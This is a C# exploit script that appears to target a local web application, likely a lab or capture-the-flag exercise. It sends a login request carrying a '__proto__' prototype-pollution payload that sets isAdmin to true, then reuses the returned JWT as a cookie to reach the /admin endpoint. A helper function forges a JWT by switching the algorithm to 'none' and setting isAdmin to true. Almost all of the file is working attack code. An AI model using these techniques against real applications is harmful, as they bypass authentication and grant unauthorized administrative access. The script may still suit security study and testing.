using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static string baseUrl = "http://localhost:3000";
    static string baseJwt = "";

    static async Task Main(string[] args)
    {
        if (File.Exists("jwt.txt"))
        {
            baseJwt = File.ReadAllText("jwt.txt");
        }
        else
        {
            await login();
            File.WriteAllText("jwt.txt", baseJwt);
        }
        Console.WriteLine(baseJwt);
        await checkadmin();
    }

    private static async Task login()
    {
        var baseAddress = new Uri(baseUrl);

        using (var handler = new HttpClientHandler())
        using (var client = new HttpClient(handler) { BaseAddress = baseAddress })
        {
            var payload = new LoginPayload();
            var content = new StringContent(JsonConvert.SerializeObject(payload), System.Text.Encoding.UTF8, "application/json");
            Console.WriteLine(JsonConvert.SerializeObject(payload));
            var result = await client.PostAsync("/login", content);
            result.EnsureSuccessStatusCode();

            string resultContent = await result.Content.ReadAsStringAsync();
            var jObject = JObject.Parse(resultContent);
            var jwt = jObject["jwt"].ToString();
            baseJwt = jwt;
        }
    }

    private static async Task checkadmin()
    {
        var baseAddress = new Uri(baseUrl);

        var cookieContainer = new System.Net.CookieContainer();
        using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
        using (var client = new HttpClient(handler) { BaseAddress = baseAddress })
        {
            //Console.WriteLine(baseJwt);
            //var modifiedJwt = GetModifiedJWT();
            //Console.WriteLine(modifiedJwt);
            var cookieValue = $"{baseJwt}";
            cookieContainer.Add(baseAddress, new System.Net.Cookie("jwtkey", cookieValue));

            var result = await client.GetAsync("/admin");
            result.EnsureSuccessStatusCode();

            string resultContent = await result.Content.ReadAsStringAsync();
            Console.WriteLine(resultContent);
        }
    }

    private static object GetModifiedJWT()
    {
        var jwt = baseJwt.Split('.');

        switch (jwt[0].Length % 4)
        {
            case 2: jwt[0] += "=="; break;
            case 3: jwt[0] += "="; break;
        }

        switch (jwt[1].Length % 4)
        {
            case 2: jwt[1] += "=="; break;
            case 3: jwt[1] += "="; break;
        }

        var header = JsonConvert.DeserializeObject<Header>(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(jwt[0])));
        var payload = JsonConvert.DeserializeObject<Payload>(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(jwt[1])));

        header.alg = "none";

        payload.isAdmin = true;

        return $"{Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(header))).Replace("=", "")}.{Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(payload))).Replace("=", "")}.{jwt[2]}";
    }
}

public class LoginPayload
{
    public string username { get; set; } = "admin";
    [JsonProperty("__proto__")]
    public PP proto = new PP();
}

public class P
{
    [JsonProperty("__proto__")]
    public PP proto = new PP();
}

public class PP
{
    [JsonProperty("isAdmin")]
    public bool isAdmin = true;
}

public class Header
{
    public string alg { get; set; }
    public string typ { get; set; }
}

public class Payload
{
    public string username { get; set; }
    public bool isAdmin { get; set; }
    public long iat { get; set; }
}
